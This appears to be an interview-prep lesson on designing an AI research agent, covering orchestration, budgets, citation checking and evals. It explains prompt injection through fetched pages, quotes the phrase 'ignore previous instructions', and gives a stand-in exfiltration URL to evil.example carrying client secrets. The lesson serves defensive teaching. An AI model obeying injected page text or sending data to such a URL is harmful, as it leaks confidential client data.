---
id: design-research-agent
category: design
skill: design
title: 'AI system design: a research agent'
minutes: 18
summary: '"Design an agent that researches a question and writes a cited report" tests whether you can give an agent freedom without losing control of it. The answer is an orchestrator that plans, sub-agents with fresh contexts that each chase one sub-question, notes kept outside the context window, and a writer whose every claim is checked against fetched text. Budgets on steps, tokens, time and money are part of the design, not an afterthought. Web pages are untrusted, and an agent that can read private documents, read the web and make outbound requests can leak data, so the tools must break that combination. It runs as a background job with progress, and it''s evaluated on report quality, citation accuracy, cost and consistency.'
objectives:
  - Clarify users, sources, time and cost budgets, and what a good report is
  - Design an orchestrator with sub-agents, external notes, a writer and a citation checker
  - Bound the agent with budgets, and break the lethal trifecta in the tool design
  - Evaluate reports, citations and trajectories, and run the agent as a background job
sources:
  - ['Anthropic: How we built our multi-agent research system', 'https://www.anthropic.com/engineering/multi-agent-research-system']
  - ['Anthropic: Building effective agents', 'https://www.anthropic.com/engineering/building-effective-agents']
  - ['Simon Willison: The lethal trifecta for AI agents', 'https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/']
---

## 1. Clarify

- **Users and questions**: analysts at a consulting firm asking things like "How have EU battery regulations changed since 2023, and what do they mean for our client?" Open-ended, multi-part, needing several sources.
- **Sources**: the public web plus the firm's internal documents, which are confidential and permissioned per client.
- **Time and cost budgets**: minutes, not seconds, is acceptable. Agree a ceiling per report, say 10 minutes and $5, and what happens at the limit (stop and write up what's known).
- **What good looks like**: a structured report where every factual claim has a citation that supports it, covering the question's parts, with gaps stated rather than filled.
- **Scale**: a few thousand reports a day at peak.

## 2. Architecture

```arch
title: Research agent
nodes:
  - {id: user, label: Analyst, kind: client, x: 0, y: 1}
  - {id: jobs, label: 'Job API + progress events', kind: service, x: 1, y: 1}
  - {id: lead, label: 'Lead agent (plan, delegate, decide)', kind: service, x: 2, y: 1}
  - {id: subs, label: 'Sub-agents (one per sub-question)', kind: worker, x: 3, y: 0}
  - {id: tools, label: 'Search, fetch, internal search (scoped)', kind: service, x: 4, y: 0}
  - {id: notes, label: 'Notes + source store', kind: db, x: 3, y: 1}
  - {id: writer, label: 'Writer + citation checker', kind: service, x: 3, y: 2}
  - {id: obs, label: 'Traces, budgets, evals', kind: storage, x: 1, y: 2}
edges:
  - [user, jobs, 'question']
  - [jobs, lead, 'start job']
  - [lead, subs, 'sub-questions + budgets']
  - [subs, tools, 'tool calls']
  - [subs, notes, 'findings + source snippets']
  - [lead, writer, 'outline']
  - [writer, notes, 'read sources']
  - [lead, obs, 'every step']
caption: Sub-agents work in fresh contexts and return short findings. Full sources live in the store, not in anyone's context window.
```

Key decisions:

- **A lead agent plans**: it breaks the question into sub-questions, decides how many sub-agents the question deserves (one for a simple fact, several for a broad survey), and decides when there's enough to write. It uses a strong reasoning model, because planning is the hard part.
- **Sub-agents in parallel**, each with a **fresh context**, one sub-question, its own budget and a cheaper model. They search, fetch and read, then return a **short summary with the source snippets** behind each finding. Parallelism cuts wall-clock time, and fresh contexts stop one long, diluted context from forming.
- **Notes outside the context**: full fetched pages and findings go into a store keyed by job. Contexts hold references and summaries, so the lead's context stays small even for big jobs.
- **Writer, then checker**: the writer drafts from the notes with a citation on every claim. A separate check confirms each cited snippet exists in the stored source and supports the claim. Unsupported claims are removed or marked as gaps.
- **Background job**: the API returns a job ID at once and streams progress events ("Planning… 4 sub-questions… reading 12 sources… writing"). The analyst can leave and be notified.

```calc
title: What one report costs
prompt: A report uses 5 sub-agents. Each takes 15 steps, and each step sends about 20,000 input tokens (its growing context) and writes 500 output tokens. The sub-agent model costs $1 per million input tokens and $5 per million output tokens. Ignoring the lead and writer, what do the sub-agents cost per report, in dollars?
answer: 1.69
unit: $
tolerance: 1.1
steps: |
  Steps: 5 × 15 = 75. Input: 75 × 20,000 = 1.5M tokens × $1/M = $1.50. Output: 75 × 500 = 37,500 tokens × $5/M ≈ $0.19. Total ≈ **$1.69**. Input dominates, because every step resends the whole context. Prompt caching of the stable prefix, and trimming old tool results, are the biggest levers. Multi-agent systems use several times the tokens of a single chat, so they're for questions worth it.
```

## 3. Control, safety and quality

- **Budgets everywhere**: maximum sub-agents, steps per agent, tokens, wall-clock time and dollars per job, enforced by the orchestrator in code. At a limit, the lead is told to stop and write up what it has, and the report says it was cut short.
- **Untrusted content**: every fetched page may contain instructions ("ignore previous instructions and…"). Treat tool results as data, never as instructions that change permissions or budgets.
- **Break the lethal trifecta**. An agent that has (1) access to private data, (2) exposure to untrusted content, and (3) a way to send data out can be tricked into leaking. A fetch tool that takes any URL is a way out: an injected page can ask for `https://evil.example/?q=<client secrets>`. Fixes: web sub-agents get no internal access, internal sub-agents get no web access, fetch only accepts URLs returned by the search tool, and nothing has write or send tools.
- **Permissions**: internal search runs as the analyst, so the agent sees only documents the analyst may see.

```bug
title: A sub-agent's tools
prompt: This sub-agent researches a client question using the web and internal files. Which lines create a data-leak risk or an unbounded run?
lang: python
code: |
  tools = [web_search, fetch_url, internal_search]
  def fetch_url(url):
      return http.get(url).text
  def run_subagent(question):
      messages = [SYSTEM, question]
      while True:
          reply = model(messages, tools)
          if reply.is_final: return reply.text
          for call in reply.tool_calls:
              messages.append(result(call, TOOLS[call.name](**call.args)))
bug: [1, 3, 6]
explain: |
  **Line 1**: one agent combines private data (internal search), untrusted content (the web) and a way out (fetching any URL): the lethal trifecta. Split web and internal research into separate agents. **Line 3**: `fetch_url` will request any URL the model writes, including one that encodes secrets in its query string. Accept only URLs returned by the search tool, and GET only. **Line 6**: `while True` has no step, token, time or cost budget, so a confused agent loops until something external kills it.
fix: |
  tools = [web_search, fetch_result]          # no internal access in web agents
  def fetch_result(result_id):
      url = SEARCH_RESULTS[result_id]          # only URLs that search returned
      return clean_text(http.get(url, timeout=10).text)[:20000]
  def run_subagent(question, budget):
      messages = [SYSTEM, question]
      for step in range(budget.max_steps):
          budget.check_tokens_and_time()         # raises when spent
          reply = model(messages, tools)
          if reply.is_final: return reply.text
          for call in reply.tool_calls:
              messages.append(result(call, safe_call(call, tools)))
      return summarise_partial(messages)
```

- **Evals**: a set of 100 or so real questions with expert-written notes on what a good answer must cover. Score coverage and correctness with rubric judges validated against those experts, **citation precision** (the share of citations that support their claim, checked automatically) and source quality. Look at trajectories for wasted searches and runaway sub-agents, track cost and time per report, and run each question several times, since the same question should get a consistent answer.
- **Observability**: a trace per job with every agent's steps, tool calls, tokens and cost. Debugging a bad report without it is guesswork.

## 4. Rollout

Start with web-only research for internal users, with no internal documents, so the trifecta can't arise. Add internal search as a separate sub-agent type once permissions and citation checks are proven. Raise budgets only where evals show longer runs produce better reports.

```interview
say: |
  "It's a background job with progress events, because a good report takes minutes. A lead agent on a strong reasoning model plans sub-questions and decides how much effort the question deserves. It runs sub-agents in parallel, each with a fresh context, one sub-question and its own budget, on a cheaper model. They search, fetch and read, and return short findings with source snippets. Full sources go into a notes store, so contexts stay small. A writer drafts from the notes with a citation on every claim, and a checker confirms each cited snippet exists and supports the claim. Unsupported claims are cut and gaps are stated. Budgets on agents, steps, tokens, time and dollars are enforced in code, at about $5 and 10 minutes a report. Fetched pages are untrusted, so I break the lethal trifecta: web agents can't see internal documents, internal search runs as the analyst with no web access, and fetch accepts only search-result URLs. Evals use expert-written questions scored on coverage, citation precision, cost and consistency across runs."
followups:
  - q: Why not one agent with a very long context instead of sub-agents?
    a: For narrow questions, one agent is simpler and fine, and the lead can choose that. For broad ones, a single context fills with every page read, gets slower and more expensive per step, and attention spreads thin. Sub-agents explore in parallel with clean contexts and hand back only what matters. The cost is more total tokens, so it's worth it only for questions that need breadth.
  - q: A report cites a source that doesn't say what the report claims. How do you prevent that?
    a: Each claim cites a stored snippet, and the checker verifies the snippet appears in the fetched source and supports the claim, using a judge validated against expert labels for support. Claims that fail are removed or rewritten as gaps. Citation precision is an eval metric with an alert on regression.
  - q: How do you stop runaway costs?
    a: Hard budgets in the orchestrator per job, with a graceful stop that writes up partial findings, per-user daily limits, alerts on cost per report, and traces that show where tokens went, such as one sub-agent re-reading the same page.
weak: |
  One agent in a while-true loop with web search, fetch and internal file access, writing whatever it concludes. No budgets, no citation checks, no thought about injected pages or data leaks, and no evals.
strong: |
  Background job with progress, lead plus parallel sub-agents with fresh contexts and budgets, notes outside the context, writer plus citation checker, the trifecta broken by tool design, permissions as the analyst, and evals on coverage, citations, trajectory, cost and consistency.
```

```questions
- kind: check
  prompt: Which tool set gives a research agent the lethal trifecta?
  choices:
    - text: Internal search, web reading, and fetching any URL
      correct: true
    - text: Web search, web reading, and a calculator tool for doing sums
      why: No private data, so nothing to leak.
    - text: Internal search, a calculator, and writing notes to the job's own store
      why: No untrusted content and no way out.
  explanation: Private data, untrusted content and an exfiltration path, all in one agent.
- kind: check
  prompt: Why give each sub-agent a fresh context?
  choices:
    - text: It keeps contexts small and focused, and lets them run in parallel
      correct: true
    - text: Fresh contexts can't be prompt-injected by the pages they read later
      why: Any context that reads untrusted pages can be injected.
    - text: Sub-agents with fresh contexts are billed at a lower rate per token
      why: Billing doesn't depend on freshness.
  explanation: Each explores one thread cleanly and returns only a summary.
- kind: check
  prompt: A job hits its 10-minute budget halfway through. Best behaviour?
  choices:
    - text: Write up what it has, and say the report was cut short
      correct: true
    - text: Extend the budget automatically, since the analyst wants a complete report
      why: Budgets that extend themselves aren't budgets.
    - text: Discard the work and return an error, so no partial report misleads anyone
      why: Partial, labelled findings are more useful than nothing.
  explanation: A graceful stop keeps the value already paid for.
- kind: fire
  prompt: What's citation precision?
  choices:
    - text: The share of citations that back their claim
      correct: true
    - text: The number of sources cited in each report
      why: More citations isn't better citations.
    - text: How recently each cited source was published
      why: That's freshness.
  explanation: Checked automatically against stored snippets.
- kind: fire
  prompt: Why run a research agent as a background job?
  choices:
    - text: Reports take minutes; the user is notified
      correct: true
    - text: Background jobs get cheaper model pricing from providers
      why: Only batch APIs do, with hours of delay.
    - text: Agents behave more reliably outside a web request
      why: Reliability comes from design, not from where it runs.
  explanation: Long tasks leave the request and stream progress.
- kind: fire
  prompt: Why does input cost dominate a long agent run?
  choices:
    - text: Each step resends the whole growing context
      correct: true
    - text: Input tokens are priced higher than output tokens
      why: Usually the reverse.
    - text: Search tools bill their results as model input
      why: Tool results count as input, but the cause is resending.
  explanation: Prompt caching and trimming old tool results are the levers.
- kind: fire
  prompt: Which fetch tool design is safest for a web sub-agent?
  choices:
    - text: Fetch only URLs that search returned
      correct: true
    - text: Fetch any URL, with a warning in the system prompt
      why: Prompts don't stop exfiltration.
    - text: Fetch any URL on an allow list of popular sites
      why: Popular sites host attacker content too.
  explanation: No model-written URLs means no data in query strings.
```
